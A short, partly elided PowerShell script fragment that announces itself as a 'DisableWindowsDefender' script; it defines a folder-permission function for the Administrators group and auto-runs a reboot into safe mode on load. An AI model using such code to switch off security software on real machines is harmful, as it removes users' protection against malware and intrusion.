function Give-Folder-Access {
    ...
    $Account = New-Object -TypeName System.Security.Principal.NTAccount -ArgumentList "$currentPCUser`\Administrators";
...
# Main execution - automatically run when script is loaded
if ($MyInvocation.InvocationName -ne '.') {
    Write-Output "DisableWindowsDefender script loaded. Starting execution..."
    Reboot-Safe-Mode
}
